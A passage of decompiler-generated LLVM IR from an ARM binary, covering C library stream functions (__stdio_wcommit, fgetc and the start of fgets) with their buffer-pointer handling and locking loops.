  ret i32 %v1_16088

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1603c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_15fdc, { 1, 0 }
  uselistorder i32 %v4_15f9c, { 2, 1, 0 }
  uselistorder i32 %v4_15f6c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_16078, { 1, 0 }
  uselistorder label %dec_label_pc_16064, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15ffc, { 1, 0 }
  uselistorder label %dec_label_pc_15fd8, { 1, 0 }
  uselistorder label %dec_label_pc_15fb8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_160a8 = load i32, i32* @r4, align 4
  store i32 %v3_160a8, i32* %stack_var_-8, align 4
  %v1_160ac = add i32 %arg1, 8
  %v2_160ac = inttoptr i32 %v1_160ac to i32*
  %v3_160ac = load i32, i32* %v2_160ac, align 4
  store i32 %v3_160ac, i32* @r1, align 4
  %v1_160b0 = add i32 %arg1, 16
  %v2_160b0 = inttoptr i32 %v1_160b0 to i32*
  %v3_160b0 = load i32, i32* %v2_160b0, align 4
  %v9_160b4 = icmp eq i32 %v3_160b0, %v3_160ac
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_160b4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_160ac, i32* %v2_160b0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_160c0 = xor i1 %v9_160b4, true
  call void @__pseudo_cond_branch(i1 %v1_160c0, i32 ptrtoint (i32* @global_var_17a98.632 to i32))
  %v0_160c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_160c4 = add i32 %v0_160c4, 8
  %v2_160c4 = inttoptr i32 %v1_160c4 to i32*
  %v3_160c4 = load i32, i32* %v2_160c4, align 4
  %v1_160c8 = add i32 %v0_160c4, 16
  %v2_160c8 = inttoptr i32 %v1_160c8 to i32*
  %v3_160c8 = load i32, i32* %v2_160c8, align 4
  %v2_160cc = sub i32 %v3_160c8, %v3_160c4
  %v2_160d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_160d0, i32* @r4, align 4
  ret i32 %v2_160cc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_160d8 = load i32, i32* @r4, align 4
  store i32 %v3_160d8, i32* %stack_var_-20, align 4
  %v6_160d8 = load i32, i32* @r5, align 4
  %v9_160d8 = load i32, i32* @r6, align 4
  %v12_160d8 = load i32, i32* @r7, align 4
  %v15_160d8 = load i32, i32* @lr, align 4
  %v1_160dc = add i32 %arg1, 52
  %v2_160dc = inttoptr i32 %v1_160dc to i32*
  %v3_160dc = load i32, i32* %v2_160dc, align 4
  store i32 %v3_160dc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_160e0 = icmp eq i32 %v3_160dc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_160e0, label %dec_label_pc_16114, label %dec_label_pc_160f0

dec_label_pc_160f0:                               ; preds = %entry
  %v1_160f0 = add i32 %arg1, 16
  %v2_160f0 = inttoptr i32 %v1_160f0 to i32*
  %v3_160f0 = load i32, i32* %v2_160f0, align 4
  store i32 %v3_160f0, i32* %r2.global-to-local, align 4
  %v1_160f4 = add i32 %arg1, 24
  %v2_160f4 = inttoptr i32 %v1_160f4 to i32*
  %v3_160f4 = load i32, i32* %v2_160f4, align 4
  store i32 %v3_160f4, i32* %r3.global-to-local, align 4
  %v3_160f8 = icmp uge i32 %v3_160f0, %v3_160f4
  store i1 %v3_160f8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_160f8, label %dec_label_pc_16108, label %.thread

.thread:                                          ; preds = %dec_label_pc_160f0
  %v2_160fc = inttoptr i32 %v3_160f0 to i8*
  %v3_160fc = load i8, i8* %v2_160fc, align 1
  %v4_160fc = zext i8 %v3_160fc to i32
  store i32 %v4_160fc, i32* %r5.global-to-local, align 4
  %v6_160fc = add i32 %v3_160f0, 1
  store i32 %v6_160fc, i32* %r2.global-to-local, align 4
  store i32 %v6_160fc, i32* %v2_160f0, align 4
  br label %dec_label_pc_1620c

dec_label_pc_16108:                               ; preds = %dec_label_pc_160f0
  %v1_16108 = inttoptr i32 %arg1 to i16*
  %v2_16108 = call i32 @getc_unlocked(i16* %v1_16108)
  store i32 %v2_16108, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1620c

dec_label_pc_16114:                               ; preds = %entry
  %v0_16114 = call i32 @__aeabi_read_tp()
  %v0_16118 = load i32, i32* @r7, align 4
  %v1_16118 = add i32 %v0_16118, 64
  %v2_16118 = inttoptr i32 %v1_16118 to i32*
  %v3_16118 = load i32, i32* %v2_16118, align 4
  store i32 %v3_16118, i32* %r3.global-to-local, align 4
  %v1_1611c = add i32 %v0_16114, -1168
  store i32 %v1_1611c, i32* @r6, align 4
  %v3_16120 = icmp uge i32 %v3_16118, %v1_1611c
  store i1 %v3_16120, i1* %cpsr_c.global-to-local, align 1
  %v9_16120 = icmp eq i32 %v3_16118, %v1_1611c
  br i1 %v9_16120, label %dec_label_pc_16168, label %dec_label_pc_16128

dec_label_pc_16128:                               ; preds = %dec_label_pc_16114
  %v1_16128 = add i32 %v0_16118, 56
  store i32 %v1_16128, i32* @r5, align 4
  store i32 %v1_16128, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16134:                               ; preds = %dec_label_pc_16140.dec_label_pc_16134_crit_edge, %dec_label_pc_16128
  %v0_16134 = phi i32 [ %v0_16134.pre, %dec_label_pc_16140.dec_label_pc_16134_crit_edge ], [ %v1_16128, %dec_label_pc_16128 ]
  %v1_16134 = inttoptr i32 %v0_16134 to i32*
  %v2_16134 = load i32, i32* %v1_16134, align 4
  store i32 %v2_16134, i32* %r3.global-to-local, align 4
  %v1_16138 = load i32, i32* @r4, align 4
  %v3_16138 = icmp uge i32 %v2_16134, %v1_16138
  store i1 %v3_16138, i1* %cpsr_c.global-to-local, align 1
  %v9_16138 = icmp eq i32 %v2_16134, %v1_16138
  br i1 %v9_16138, label %dec_label_pc_16140, label %dec_label_pc_16158

dec_label_pc_16140:                               ; preds = %dec_label_pc_16134
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16150 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16150, label %dec_label_pc_16154, label %dec_label_pc_16140.dec_label_pc_16134_crit_edge

dec_label_pc_16140.dec_label_pc_16134_crit_edge:  ; preds = %dec_label_pc_16140
  %v0_16134.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16134

dec_label_pc_16154:                               ; preds = %dec_label_pc_16140
  %v0_16154 = load i32, i32* @r4, align 4
  store i32 %v0_16154, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16158

dec_label_pc_16158:                               ; preds = %dec_label_pc_16134, %dec_label_pc_16154
  %v0_16158 = phi i32 [ %v0_16154, %dec_label_pc_16154 ], [ %v2_16134, %dec_label_pc_16134 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16158 = icmp eq i32 %v0_16158, 0
  br i1 %v2_16158, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_16158
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_16158, %bb
  store i32 90468, i32* @lr, align 4
  %v1_16160 = xor i1 %v2_16158, true
  call void @__pseudo_cond_branch(i1 %v1_16160, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_16164 = load i32, i32* @r6, align 4
  %v1_16164 = load i32, i32* @r7, align 4
  %v2_16164 = add i32 %v1_16164, 64
  %v3_16164 = inttoptr i32 %v2_16164 to i32*
  store i32 %v0_16164, i32* %v3_16164, align 4
  %v0_16168.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16168

dec_label_pc_16168:                               ; preds = %dec_label_pc_16114, %bb18
  %v1_16178 = phi i32 [ %v0_16118, %dec_label_pc_16114 ], [ %v0_16168.pre, %bb18 ]
  %v1_16168 = add i32 %v1_16178, 60
  %v2_16168 = inttoptr i32 %v1_16168 to i32*
  %v3_16168 = load i32, i32* %v2_16168, align 4
  store i32 %v3_16168, i32* %r2.global-to-local, align 4
  %v1_1616c = add i32 %v1_16178, 16
  %v2_1616c = inttoptr i32 %v1_1616c to i32*
  %v3_1616c = load i32, i32* %v2_1616c, align 4
  store i32 %v3_1616c, i32* @r1, align 4
  %v1_16170 = add i32 %v1_16178, 24
  %v2_16170 = inttoptr i32 %v1_16170 to i32*
  %v3_16170 = load i32, i32* %v2_16170, align 4
  store i32 %v3_16170, i32* %r3.global-to-local, align 4
  %v1_16174 = add i32 %v3_16168, 1
  store i32 %v1_16174, i32* %r2.global-to-local, align 4
  store i32 %v1_16174, i32* %v2_16168, align 4
  %v0_1617c = load i32, i32* @r1, align 4
  %v1_1617c = load i32, i32* %r3.global-to-local, align 4
  %v3_1617c = icmp uge i32 %v0_1617c, %v1_1617c
  store i1 %v3_1617c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1617c, label %dec_label_pc_1618c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16168
  %v2_16180 = inttoptr i32 %v0_1617c to i8*
  %v3_16180 = load i8, i8* %v2_16180, align 1
  %v4_16180 = zext i8 %v3_16180 to i32
  store i32 %v4_16180, i32* %r5.global-to-local, align 4
  %v6_16180 = add i32 %v0_1617c, 1
  store i32 %v6_16180, i32* @r1, align 4
  %v2_16184 = load i32, i32* @r7, align 4
  %v3_16184 = add i32 %v2_16184, 16
  %v4_16184 = inttoptr i32 %v3_16184 to i32*
  store i32 %v6_16180, i32* %v4_16184, align 4
  br label %dec_label_pc_16198

dec_label_pc_1618c:                               ; preds = %dec_label_pc_16168
  %v0_1618c = load i32, i32* @r7, align 4
  %v1_16190 = inttoptr i32 %v0_1618c to i16*
  %v2_16190 = call i32 @getc_unlocked(i16* %v1_16190)
  store i32 %v2_16190, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16198

dec_label_pc_16198:                               ; preds = %.thread2, %dec_label_pc_1618c
  %v0_16198 = load i32, i32* @r7, align 4
  %v1_16198 = add i32 %v0_16198, 60
  %v2_16198 = inttoptr i32 %v1_16198 to i32*
  %v3_16198 = load i32, i32* %v2_16198, align 4
  %v1_1619c = add i32 %v3_16198, -1
  store i32 %v1_1619c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_161a0 = icmp eq i32 %v1_1619c, 0
  store i32 %v1_1619c, i32* %v2_16198, align 4
  br i1 %v2_161a0, label %dec_label_pc_161ac, label %dec_label_pc_1620c

dec_label_pc_161ac:                               ; preds = %dec_label_pc_16198
  %v0_161ac = load i32, i32* %r3.global-to-local, align 4
  %v1_161ac = load i32, i32* @r7, align 4
  %v2_161ac = add i32 %v1_161ac, 64
  %v3_161ac = inttoptr i32 %v2_161ac to i32*
  store i32 %v0_161ac, i32* %v3_161ac, align 4
  %v0_161b0 = load i32, i32* @r7, align 4
  %v1_161b0 = add i32 %v0_161b0, 56
  store i32 %v1_161b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161b4

dec_label_pc_161b4:                               ; preds = %dec_label_pc_161e4.dec_label_pc_161b4_crit_edge, %dec_label_pc_161ac
  %v0_161bc = phi i32 [ %v0_161bc.pre, %dec_label_pc_161e4.dec_label_pc_161b4_crit_edge ], [ %v1_161b0, %dec_label_pc_161ac ]
  %v0_161b4 = phi i32 [ %v0_161b4.pre, %dec_label_pc_161e4.dec_label_pc_161b4_crit_edge ], [ %v0_161b0, %dec_label_pc_161ac ]
  %v1_161b4 = add i32 %v0_161b4, 56
  %v2_161b4 = inttoptr i32 %v1_161b4 to i32*
  %v3_161b4 = load i32, i32* %v2_161b4, align 4
  store i32 %v3_161b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_161bc, i32* %r2.global-to-local, align 4
  %v1_161c022 = inttoptr i32 %v0_161bc to i32*
  %v2_161c023 = load i32, i32* %v1_161c022, align 4
  store i32 %v2_161c023, i32* %r3.global-to-local, align 4
  %v3_161c425 = icmp uge i32 %v2_161c023, %v3_161b4
  store i1 %v3_161c425, i1* %cpsr_c.global-to-local, align 1
  %v9_161c431 = icmp eq i32 %v2_161c023, %v3_161b4
  br i1 %v9_161c431, label %dec_label_pc_161cc, label %dec_label_pc_161e4

dec_label_pc_161cc:                               ; preds = %dec_label_pc_161b4, %dec_label_pc_161cc.dec_label_pc_161c0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161dc, label %dec_label_pc_161e0, label %dec_label_pc_161cc.dec_label_pc_161c0_crit_edge

dec_label_pc_161cc.dec_label_pc_161c0_crit_edge:  ; preds = %dec_label_pc_161cc
  %v0_161c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_161c0 = inttoptr i32 %v0_161c0.pre to i32*
  %v2_161c0 = load i32, i32* %v1_161c0, align 4
  store i32 %v2_161c0, i32* %r3.global-to-local, align 4
  %v3_161c4 = icmp uge i32 %v2_161c0, %v1_161c4.pre
  store i1 %v3_161c4, i1* %cpsr_c.global-to-local, align 1
  %v9_161c4 = icmp eq i32 %v2_161c0, %v1_161c4.pre
  br i1 %v9_161c4, label %dec_label_pc_161cc, label %dec_label_pc_161e4

dec_label_pc_161e0:                               ; preds = %dec_label_pc_161cc
  %v0_161e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161e4

dec_label_pc_161e4:                               ; preds = %dec_label_pc_161b4, %dec_label_pc_161cc.dec_label_pc_161c0_crit_edge, %dec_label_pc_161e0
  %v0_161ec = phi i32 [ %v0_161e0, %dec_label_pc_161e0 ], [ %v2_161c023, %dec_label_pc_161b4 ], [ %v2_161c0, %dec_label_pc_161cc.dec_label_pc_161c0_crit_edge ]
  %v1_161e4 = phi i32 [ %v0_161e0, %dec_label_pc_161e0 ], [ %v3_161b4, %dec_label_pc_161b4 ], [ %v1_161c4.pre, %dec_label_pc_161cc.dec_label_pc_161c0_crit_edge ]
  %v3_161e4 = icmp uge i32 %v0_161ec, %v1_161e4
  store i1 %v3_161e4, i1* %cpsr_c.global-to-local, align 1
  %v9_161e4 = icmp eq i32 %v0_161ec, %v1_161e4
  br i1 %v9_161e4, label %dec_label_pc_161ec, label %dec_label_pc_161e4.dec_label_pc_161b4_crit_edge

dec_label_pc_161e4.dec_label_pc_161b4_crit_edge:  ; preds = %dec_label_pc_161e4
  %v0_161b4.pre = load i32, i32* @r7, align 4
  %v0_161bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_161b4

dec_label_pc_161ec:                               ; preds = %dec_label_pc_161e4
  %v2_161ec = icmp ne i32 %v1_161e4, 0
  store i1 %v2_161ec, i1* %cpsr_c.global-to-local, align 1
  %v7_161f0 = icmp slt i32 %v1_161e4, 2
  br i1 %v7_161f0, label %dec_label_pc_1620c, label %dec_label_pc_161f4

dec_label_pc_161f4:                               ; preds = %dec_label_pc_161ec
  %v0_161f8 = load i32, i32* @r1, align 4
  %v1_161f8 = add i32 %v0_161f8, 129
  store i32 %v1_161f8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1620c

dec_label_pc_1620c:                               ; preds = %.thread, %dec_label_pc_16198, %dec_label_pc_161f4, %dec_label_pc_161ec, %dec_label_pc_16108
  %v0_1620c = load i32, i32* %r5.global-to-local, align 4
  %v2_16214 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16214, i32* @r4, align 4
  store i32 %v6_160d8, i32* @r5, align 4
  store i32 %v9_160d8, i32* @r6, align 4
  store i32 %v12_160d8, i32* @r7, align 4
  store i32 %v15_160d8, i32* @lr, align 4
  ret i32 %v0_1620c

; uselistorder directives
  uselistorder i32 %v0_161e0, { 1, 0, 2 }
  uselistorder i32 %v1_161c4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1617c, { 1, 0, 2 }
  uselistorder i32 %v1_16178, { 0, 2, 1 }
  uselistorder i32 %v1_16138, { 1, 0 }
  uselistorder i32 %v3_160f0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 4, 3, 0, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg1, { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_1620c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_161e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161cc, { 1, 0 }
  uselistorder label %dec_label_pc_16198, { 1, 0 }
  uselistorder label %dec_label_pc_16168, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_16158, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1621c = load i32, i32* @r4, align 4
  store i32 %v3_1621c, i32* %stack_var_-32, align 4
  %v6_1621c = load i32, i32* @r5, align 4
  %v9_1621c = load i32, i32* @r6, align 4
  %v12_1621c = load i32, i32* @r7, align 4
  %v15_1621c = load i32, i32* @r8, align 4
  %v24_1621c = load i32, i32* @lr, align 4
  %v1_16220 = add i32 %arg3, 52
  %v2_16220 = inttoptr i32 %v1_16220 to i32*
  %v3_16220 = load i32, i32* %v2_16220, align 4
  store i32 %v3_16220, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16224 = icmp eq i32 %v3_16220, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_16224, label %dec_label_pc_16238, label %dec_label_pc_1629c

dec_label_pc_16238:                               ; preds = %entry
  %v0_16238 = call i32 @__aeabi_read_tp()
  %v1_1623c = add i32 %arg3, 64
  %v2_1623c = inttoptr i32 %v1_1623c to i32*
  %v3_1623c = load i32, i32* %v2_1623c, align 4
  store i32 %v3_1623c, i32* %r3.global-to-local, align 4
  %v1_16240 = add i32 %v0_16238, -1168
  store i32 %v1_16240, i32* @r8, align 4
  %v3_16244 = icmp uge i32 %v3_1623c, %v1_16240
  store i1 %v3_16244, i1* %cpsr_c.global-to-local, align 1
  %v9_16244 = icmp eq i32 %v3_1623c, %v1_16240
  br i1 %v9_16244, label %dec_label_pc_16290, label %dec_label_pc_1624c

dec_label_pc_1624c:                               ; preds = %dec_label_pc_16238
  %v1_1624c = add i32 %arg3, 56
  store i32 %v1_1624c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1624c, i32* %r2.global-to-local, align 4
  %v0_16258 = load i32, i32* @r6, align 4
  store i32 %v0_16258, i32* @r4, align 4
  %v1_1625c36 = inttoptr i32 %v1_1624c to i32*
  %v2_1625c37 = load i32, i32* %v1_1625c36, align 4
  store i32 %v2_1625c37, i32* %r3.global-to-local, align 4
  %v3_1626039 = icmp uge i32 %v2_1625c37, %v0_16258
  store i1 %v3_1626039, i1* %cpsr_c.global-to-local, align 1
  %v9_1626045 = icmp eq i32 %v2_1625c37, %v0_16258
  br i1 %v9_1626045, label %dec_label_pc_16268, label %dec_label_pc_16280

dec_label_pc_16268:                               ; preds = %dec_label_pc_1624c, %dec_label_pc_16268.dec_label_pc_1625c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16278 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16278, label %dec_label_pc_1627c, label %dec_label_pc_16268.dec_label_pc_1625c_crit_edge

dec_label_pc_16268.dec_label_pc_1625c_crit_edge:  ; preds = %dec_label_pc_16268
  %v0_1625c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16260.pre = load i32, i32* @r4, align 4
  %v1_1625c = inttoptr i32 %v0_1625c.pre to i32*
  %v2_1625c = load i32, i32* %v1_1625c, align 4
  store i32 %v2_1625c, i32* %r3.global-to-local, align 4
  %v3_16260 = icmp uge i32 %v2_1625c, %v1_16260.pre
  store i1 %v3_16260, i1* %cpsr_c.global-to-local, align 1
  %v9_16260 = icmp eq i32 %v2_1625c, %v1_16260.pre
  br i1 %v9_16260, label %dec_label_pc_16268, label %dec_label_pc_16280

dec_label_pc_1627c:                               ; preds = %dec_label_pc_16268
  %v0_1627c = load i32, i32* @r4, align 4
  store i32 %v0_1627c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16280

dec_label_pc_16280:                               ; preds = %dec_label_pc_1624c, %dec_label_pc_16268.dec_label_pc_1625c_crit_edge, %dec_label_pc_1627c
  %v0_16280 = phi i32 [ %v0_1627c, %dec_label_pc_1627c ], [ %v2_1625c37, %dec_label_pc_1624c ], [ %v2_1625c, %dec_label_pc_16268.dec_label_pc_1625c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16280 = icmp eq i32 %v0_16280, 0
  br i1 %v2_16280, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_16280
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_16280, %bb
  store i32 90764, i32* @lr, align 4
  %v1_16288 = xor i1 %v2_16280, true
  call void @__pseudo_cond_branch(i1 %v1_16288, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_1628c = load i32, i32* @r8, align 4
  %v1_1628c = load i32, i32* @r7, align 4
  %v2_1628c = add i32 %v1_1628c, 64
  %v3_1628c = inttoptr i32 %v2_1628c to i32*
  store i32 %v0_1628c, i32* %v3_1628c, align 4
  br label %dec_label_pc_16290

dec_label_pc_16290:                               ; preds = %dec_label_pc_16238, %bb20
  %v0_16290 = load i32, i32* @r7, align 4
  %v1_16290 = add i32 %v0_16290, 60
  %v2_16290 = inttoptr i32 %v1_16290 to i32*
  %v3_16290 = load i32, i32* %v2_16290, align 4
  %v1_16294 = add i32 %v3_16290, 1
  store i32 %v1_16294, i32* %r3.global-to-local, align 4
  store i32 %v1_16294, i32* %v2_16290, align 4
  %v0_1629c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_162a0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_162a4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1629c

dec_label_pc_1629c:                               ; preds = %entry, %dec_label_pc_16290
  %v0_162a4 = phi i32 [ %arg3, %entry ], [ %v0_162a4.pre, %dec_label_pc_16290 ]
  %v0_162a0 = phi i32 [ %arg2, %entry ], [ %v0_162a0.pre, %dec_label_pc_16290 ]
  %v0_1629c = phi i32 [ %arg1, %entry ], [ %v0_1629c.pre, %dec_label_pc_16290 ]
  store i32 %v0_162a0, i32* %r1.global-to-local, align 4
  store i32 %v0_162a4, i32* %r2.global-to-local, align 4
  %v3_162a8 = inttoptr i32 %v0_1629c to i8*
  %v4_162a8 = call i32 @__GI_fgets_unlocked(i8* %v3_162a8, i32 %v0_162a0, i32 %v0_162a4)
  %v0_162ac = load i32, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162ac = icmp eq i32 %v0_162ac, 0
  store i32 %v4_162a8, i32* %r8.global-to-local, align 4
  br i1 %v2_162ac, label %dec_label_pc_162b8, label %dec_label_pc_1632c

dec_label_pc_162b8:                               ; preds = %dec_label_pc_1629c
  %v0_162b8 = load i32, i32* @r7, align 4
  %v1_162b8 = add i32 %v0_162b8, 60
  %v2_162b8 = inttoptr i32 %v1_162b8 to i32*
  %v3_162b8 = load i32, i32* %v2_162b8, align 4
  %v1_162bc = add i32 %v3_162b8, -1
  store i32 %v1_162bc, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_162c0 = icmp eq i32 %v1_162bc, 0
  store i32 %v1_162bc, i32* %v2_162b8, align 4
  br i1 %v2_162c0, label %dec_label_pc_162cc, label %dec_label_pc_1632c

dec_label_pc_162cc:                               ; preds = %dec_label_pc_162b8
  %v0_162cc = load i32, i32* %r3.global-to-local, align 4
  %v1_162cc = load i32, i32* @r7, align 4
  %v2_162cc = add i32 %v1_162cc, 64
  %v3_162cc = inttoptr i32 %v2_162cc to i32*
  store i32 %v0_162cc, i32* %v3_162cc, align 4
  %v0_162d0 = load i32, i32* @r7, align 4
  %v1_162d0 = add i32 %v0_162d0, 56
  store i32 %v1_162d0, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_162d4

dec_label_pc_162d4:                               ; preds = %dec_label_pc_16304.dec_label_pc_162d4_crit_edge, %dec_label_pc_162cc
  %v0_162dc = phi i32 [ %v0_162dc.pre, %dec_label_pc_16304.dec_label_pc_162d4_crit_edge ], [ %v1_162d0, %dec_label_pc_162cc ]
  %v0_162d4 = phi i32 [ %v0_162d4.pre, %dec_label_pc_16304.dec_label_pc_162d4_crit_edge ], [ %v0_162d0, %dec_label_pc_162cc ]
  %v1_162d4 = add i32 %v0_162d4, 56
  %v2_162d4 = inttoptr i32 %v1_162d4 to i32*
  %v3_162d4 = load i32, i32* %v2_162d4, align 4
  store i32 %v3_162d4, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_162dc, i32* %r2.global-to-local, align 4
  %v1_162e024 = inttoptr i32 %v0_162dc to i32*
  %v2_162e025 = load i32, i32* %v1_162e024, align 4
  store i32 %v2_162e025, i32* %r3.global-to-local, align 4
  %v3_162e427 = icmp uge i32 %v2_162e025, %v3_162d4
  store i1 %v3_162e427, i1* %cpsr_c.global-to-local, align 1
  %v9_162e433 = icmp eq i32 %v2_162e025, %v3_162d4
  br i1 %v9_162e433, label %dec_label_pc_162ec, label %dec_label_pc_16304

dec_label_pc_162ec:                               ; preds = %dec_label_pc_162d4, %dec_label_pc_162ec.dec_label_pc_162e0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_162fc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_162fc, label %dec_label_pc_16300, label %dec_label_pc_162ec.dec_label_pc_162e0_crit_edge

dec_label_pc_162ec.dec_label_pc_162e0_crit_edge:  ; preds = %dec_label_pc_162ec
  %v0_162e0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_162e4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_162e0 = inttoptr i32 %v0_162e0.pre to i32*
  %v2_162e0 = load i32, i32* %v1_162e0, align 4
  store i32 %v2_162e0, i32* %r3.global-to-local, align 4
  %v3_162e4 = icmp uge i32 %v2_162e0, %v1_162e4.pre
  store i1 %v3_162e4, i1* %cpsr_c.global-to-local, align 1
  %v9_162e4 = icmp eq i32 %v2_162e0, %v1_162e4.pre
  br i1 %v9_162e4, label %dec_label_pc_162ec, label %dec_label_pc_16304

dec_label_pc_16300:                               ; preds = %dec_label_pc_162ec
  %v0_16300 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16300, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16304

dec_label_pc_16304:                               ; preds = %dec_label_pc_162d4, %dec_label_pc_162ec.dec_label_pc_162e0_crit_edge, %dec_label_pc_16300
  %v0_1630c = phi i32 [ %v0_16300, %dec_label_pc_16300 ], [ %v2_162e025, %dec_label_pc_162d4 ], [ %v2_162e0, %dec_label_pc_162ec.dec_label_pc_162e0_crit_edge ]
